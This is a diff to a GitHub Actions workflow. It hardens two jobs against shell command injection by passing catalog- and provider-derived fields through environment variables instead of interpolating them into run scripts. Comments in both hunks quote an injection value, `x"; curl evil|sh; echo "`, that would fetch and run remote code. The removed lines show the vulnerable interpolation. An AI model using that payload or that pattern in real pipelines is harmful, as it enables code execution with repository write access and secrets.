@@ -1225,13 +1225,19 @@ jobs:
           HEAD_BRANCH: sparq-agent/issue-${{ inputs.issue_number }}-${{ github.run_id }}-${{ github.run_attempt }}
           # `<app-slug>[bot]` == the login the worker's `target` step verifies via /users/<slug>[bot].
           VERIFY_BOT_LOGIN: ${{ steps.app-token-recon.outputs.app-slug }}[bot]
+          # Catalog-controlled account fields reach this contents:write + PROVENANCE_SALT job via
+          # env ONLY — never interpolated into the run: shell source, where a provider/alias like
+          # `x"; curl evil|sh; echo "` would execute (issue #199). worker-pr.py re-validates the
+          # provider server-side (provenance_record: must be anthropic|openai).
+          IMPL_PROVIDER: ${{ needs.claim.outputs.provider }}
+          IMPL_ALIAS: ${{ needs.claim.outputs.model }}
         run: |
           python3 registry/scripts/worker-pr.py reconcile-provenance \
             --registry-repo "$GITHUB_REPOSITORY" \
             --target-repo "${{ inputs.target_repo }}" \
             --head-branch "$HEAD_BRANCH" \
-            --impl-provider "${{ needs.claim.outputs.provider }}" \
-            --impl-alias "${{ needs.claim.outputs.model }}" \
+            --impl-provider "$IMPL_PROVIDER" \
+            --impl-alias "$IMPL_ALIAS" \
             --issue "${{ inputs.issue_number }}" \
             --run-key "$GITHUB_RUN_ID.$GITHUB_RUN_ATTEMPT" \
             --verify-bot-login "$VERIFY_BOT_LOGIN"
@@ -1293,12 +1299,20 @@ jobs:
           # salts the handle so only the 16-hex hash is stored. This job runs no target code.
           WORKER_ACCOUNT_HANDLE: ${{ needs.claim.outputs.account }}
           PROVENANCE_SALT: ${{ secrets.PROVENANCE_SALT }}
+          # Catalog-controlled (provider/alias) and provider-derived (reset-hint from a rate-limit
+          # response) fields reach this contents:write + PROVENANCE_SALT job via env ONLY — never
+          # in the run: shell source, where `x"; curl evil|sh; echo "` would execute (issue #199).
+          # model-health.py record re-validates the provider against {anthropic, openai, fleet}.
+          PROVIDER: ${{ needs.claim.outputs.provider }}
+          MODEL_ALIAS: ${{ needs.claim.outputs.model }}
+          EXIT_CLASS: ${{ needs.worker.outputs.exit_class }}
+          RESET_HINT: ${{ needs.worker.outputs.reset_hint }}
         run: |
           python3 registry/scripts/model-health.py record \
-            --provider "${{ needs.claim.outputs.provider }}" \
-            --model-alias "${{ needs.claim.outputs.model }}" \
-            --exit-class "${{ needs.worker.outputs.exit_class }}" \
-            --reset-hint "${{ needs.worker.outputs.reset_hint }}" \
+            --provider "$PROVIDER" \
+            --model-alias "$MODEL_ALIAS" \
+            --exit-class "$EXIT_CLASS" \
+            --reset-hint "$RESET_HINT" \
             --run-id "$GITHUB_RUN_ID.$GITHUB_RUN_ATTEMPT"
 
   release:
